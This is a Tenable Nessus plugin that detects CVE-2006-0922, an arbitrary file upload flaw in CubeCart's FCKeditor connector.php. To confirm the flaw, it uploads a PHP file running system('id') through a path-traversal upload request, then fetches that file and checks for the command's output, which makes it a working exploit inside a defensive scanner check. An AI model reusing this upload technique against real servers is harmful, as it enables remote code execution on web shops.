#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21187);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2006-0922");
  script_bugtraq_id(16796);
  script_xref(name:"OSVDB", value:"23624");

  script_name(english:"CubeCart FCKeditor connector.php Arbitrary File Upload");
  script_summary(english:"Tries to use CubeCart to upload a file with PHP code");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that allows execution
of arbitrary PHP code." );
 script_set_attribute(attribute:"description", value:
"The version of CubeCart installed on the remote host allows an
unauthenticated user to upload files with arbitrary PHP code and then
to execute them subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/425931" );
 script_set_attribute(attribute:"see_also", value:"http://www.cubecart.com/site/forums/index.php?showtopic=17335" );
 script_set_attribute(attribute:"see_also", value:"http://www.cubecart.com/site/forums/index.php?showtopic=17338" );
 script_set_attribute(attribute:"solution", value:
"Either apply the patch referenced in the first vendor advisory above
or upgrade to CubeCart version 3.0.10 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("cubecart_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/cubecart"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  url = string(
    dir, "/admin/includes/rte/editor/filemanager/browser/default/connectors/php/connector.php?",
    "Command=FileUpload&",
    "Type=File&",
    "CurrentFolder=/../uploads/"
  );

  # Make sure the affected script exists.
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it is...
  if ("OnUploadCompleted" >< res) {
    # Try to upload a file that will execute a command.
    cmd = "id";
    fname = string(SCRIPT_NAME, "-", unixtime(), ".php3");

    bound = "nessus";
    boundary = string("--", bound);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="NewFile"; filename="', fname, '"', "\r\n",
      "Content-Type: application/octet-stream\r\n",
      "\r\n",
      '<?php system(', cmd, ");  ?>\r\n",
  
      boundary, "--", "\r\n"
    );
    r = http_send_recv3(method: "POST ",  item: url, port: port,
      add_headers: make_array("Content-Type", "multipart/form-data; boundary="+bound), 
      data: postdata);
    if (isnull(r)) exit(0);
    res = r[2];

    # Now try to execute the command.
    http_check_remote_code(
      unique_dir    : dir,
      check_request : string("/images/uploads/", fname),
      check_result  : "uid=[0-9]+.*gid=[0-9]+.*",
      command       : cmd
    );
  }
}
